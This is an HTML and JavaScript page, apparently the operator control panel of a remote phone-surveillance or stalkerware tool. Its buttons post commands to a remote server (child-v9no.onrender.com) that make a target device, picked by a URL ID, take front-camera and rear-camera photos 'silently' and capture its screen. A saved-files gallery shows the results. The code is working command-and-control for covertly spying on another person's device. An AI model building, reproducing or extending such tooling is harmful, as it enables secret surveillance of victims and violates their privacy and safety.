<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapshot Menu</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
            --text: #ffffff;
            --accent: #00f3ff; /* Cyan color for tech look */
        }
        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            display: flex; flex-direction: column; align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%; max-width: 400px;
        }

        h3 {
            margin-top: 0;
            border-bottom: 1px solid var(--border);
            padding-bottom: 15px;
            margin-bottom: 20px;
            font-weight: 400;
            letter-spacing: 1px;
            color: var(--accent);
        }

        /* List Design */
        .list-group { margin-bottom: 25px; }
        .list-title { 
            color: #888; font-size: 0.8rem; margin-bottom: 10px; 
            font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
        }
        
        .list-item {
            display: flex; align-items: center; gap: 15px;
            background: var(--glass-bg);
            padding: 16px; border-radius: 12px; margin-bottom: 10px;
            cursor: pointer; transition: 0.2s;
            border: 1px solid var(--border);
        }
        .list-item:active { background: rgba(0, 243, 255, 0.1); transform: scale(0.98); border-color: var(--accent); }
        
        .icon-box {
            width: 40px; height: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; color: var(--accent);
        }
        
        .text-content { display: flex; flex-direction: column; flex: 1; }
        .main-text { font-size: 1rem; color: #fff; font-weight: 500; }
        .sub-text { font-size: 0.75rem; color: #aaa; margin-top: 3px; }
        
        /* Loading Animation inside button */
        .spinner {
            border: 2px solid rgba(255,255,255,0.1);
            border-top: 2px solid var(--accent);
            border-radius: 50%; width: 16px; height: 16px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Bottom Buttons */
        .btn-grid { display: flex; gap: 10px; margin-top: 20px; }
        .action-btn {
            flex: 1; padding: 12px; border-radius: 8px; border: none;
            font-weight: bold; cursor: pointer; font-size: 0.9rem;
        }
        .back-btn { background: #333; color: white; }
        .gallery-btn { background: var(--accent); color: #000; }

    </style>
</head>
<body>

    <div class="container">
        <h3><i class="fa-solid fa-camera-retro"></i> Remote Capture</h3>
        
        <div class="list-group">
            <div class="list-title">Camera Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'capture_front')">
                <div class="icon-box"><i class="fa-solid fa-user"></i></div>
                <div class="text-content">
                    <div class="main-text">Front Camera</div>
                    <div class="sub-text">Take a selfie silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>

            <div class="list-item" onclick="triggerCommand(this, 'capture_back')">
                <div class="icon-box"><i class="fa-solid fa-camera"></i></div>
                <div class="text-content">
                    <div class="main-text">Back Camera</div>
                    <div class="sub-text">Capture rear view silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>
        </div>

        <div class="list-group">
            <div class="list-title">Display Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'capture_screen')">
                <div class="icon-box"><i class="fa-solid fa-mobile-screen"></i></div>
                <div class="text-content">
                    <div class="main-text">Screen Shot</div>
                    <div class="sub-text">Capture current screen frame</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>
        </div>

        <div class="btn-grid">
            <button onclick="history.back()" class="action-btn back-btn">Back</button>
            <button onclick="goToGallery()" class="action-btn gallery-btn">View Saved Files</button>
        </div>
    </div>

    <script>
        const API_BASE = 'https://child-v9no.onrender.com'; // Apna Server URL check kar lena
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');

        // Check ID
        if(!DEVICE_ID) {
            alert("Device ID missing! Going back.");
            history.back();
        }

        function triggerCommand(element, command) {
            // UI Effect: Show Spinner
            const spinner = element.querySelector('.spinner');
            const arrow = element.querySelector('.fa-chevron-right');
            
            spinner.style.display = "block";
            arrow.style.display = "none";
            element.style.opacity = "0.7";

            // Send Command
            fetch(`${API_BASE}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: command })
            })
            .then(res => {
                // UI Reset after 1 second
                setTimeout(() => {
                    spinner.style.display = "none";
                    arrow.style.display = "block";
                    element.style.opacity = "1";
                    
                    // Toast message (Optional improvement)
                    alert("Command Sent: " + command + "\nCheck 'Saved Files' in a few seconds.");
                }, 1000);
            })
            .catch(err => {
                console.error("Error:", err);
                alert("Failed to send command!");
                element.style.opacity = "1";
            });
        }

        function goToGallery() {
            window.location.href = `saved_files.html?id=${DEVICE_ID}`;
        }
    </script>

</body>
</html>
